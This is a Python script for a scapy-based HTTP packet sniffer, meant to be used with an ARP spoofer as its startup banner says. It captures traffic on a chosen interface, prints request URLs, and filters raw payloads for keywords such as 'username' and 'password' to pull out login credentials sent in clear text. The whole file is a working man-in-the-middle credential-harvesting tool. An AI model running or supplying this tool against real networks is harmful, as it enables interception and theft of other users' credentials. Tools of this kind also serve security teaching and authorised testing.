#!/usr/bin/python3

from colorama import Fore, Style

import scapy.all
from scapy.layers import http
import psutil
from prettytable import PrettyTable
import subprocess
import re

# Retrieve the MAC address of a given network interface
def get_mac(interface):
    try:
        ifconfig_output = subprocess.check_output(["ifconfig", interface], bufsize=4096)
        mac_result = re.search("(?:[0-9a-fA-F]:?){12}", str(ifconfig_output))
        return mac_result.group(0) if mac_result else None
    except Exception as e:
        print(f"Error in get_mac: {e}")
        return None

# Retrieve the IP address of a given network interface
def get_ip(interface):
    try:
        ifconfig_output = subprocess.check_output(["ifconfig", interface], bufsize=4096)
        ip_result = re.search(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b", str(ifconfig_output))
        return ip_result.group(0) if ip_result else None
    except Exception as e:
        print(f"Error in get_ip: {e}")
        return None 

# Display a table of network interfaces, their MAC addresses, and IP addresses
def arp_table():
    addrs = psutil.net_if_addrs()
    table = PrettyTable([f'{Fore.GREEN}Interface{Style.RESET_ALL}', f'{Fore.GREEN}Mac Address{Style.RESET_ALL}', f'{Fore.GREEN}IP Address{Style.RESET_ALL}'])
    for i in list(addrs.keys())[:5]:
        mac = get_mac(i)
        ip = get_ip(i)

        if ip and mac:
            table.add_row([i, mac, ip])
        elif mac:
            table.add_row([i, mac, f"{Fore.YELLOW}No IP assigned{Style.RESET_ALL}"])
        elif ip:
            table.add_row([i, f"{Fore.YELLOW}No MAC assigned{Style.RESET_ALL}", ip])
    
    print(table)

# Extract and print details from the HTTP layer of a packet
def get_url(packet):
    http_layer = packet.getlayer('HTTPRequest')
    if http_layer and hasattr(http_layer, 'fields'):
        ip_layer = packet.getlayer('IP').fields
        print("Source:\t" + ip_layer["src"])
        print("Method:\t" + http_layer.fields["Method"].decode())
        print("Host:\t" + http_layer.fields["Host"].decode())
        print("Path:\t" + http_layer.fields["Path"].decode())
    else:
        print("No HTTPRequest layer found in the packet.")
    
# Extract and print login information from the Raw layer of a packet
def get_login_info(packet):
    if packet.haslayer(scapy.all.Raw):
        get_raw = packet[scapy.all.Raw].load
        try:
            decode_raw = get_raw.decode('utf-8')
            print(decode_raw)
            keywords = ["username", "user", "email", "pass", "login", "password", "Password"]
            for i in keywords:
                if i in decode_raw:
                    return decode_raw
        except Exception as e:
            print(e)
            return None

# Print the raw packet
def get_raw_request(packet):
    raw_request = packet.show()
    if raw_request:
        print(raw_request.fields)

# Process and print details of a sniffed packet
def process_sniffed_packet(packet):
    print(f"{Fore.GREEN}HTTP:{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[*] URL:{Style.RESET_ALL}")
    get_url(packet)
    print(f"{Fore.GREEN}[*] LOGIN:{Style.RESET_ALL}")    
    islogin = get_login_info(packet)
    if islogin:
        print(f"{Fore.GREEN}[*] Login Information Available:{Style.RESET_ALL}")
        print(islogin)
    else:
        print("No login information: Packet has no HTTP layer.")
    print(f"{Fore.GREEN}[*] Raw Packet:{Style.RESET_ALL}")
    get_raw_request(packet)
    print(f"{Fore.RED}**************************************************{Style.RESET_ALL}")
        

# Sniff packets on the specified network interface
def sniffing(interface):
    scapy.all.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def main():
    try:
        print(f"{Fore.RED}***Packet Sniffer***{Style.RESET_ALL}")
        print(f"{Fore.LIGHTMAGENTA_EX}***Don't forget to start the ARP Spoofer***{Style.RESET_ALL}")
        arp_table()
        interface = input("Enter the interface name >>\t")
        sniffing(interface)
    except KeyboardInterrupt:
        exit(0)
    except Exception as e:
        print(e)

if __name__ == "__main__":
    main()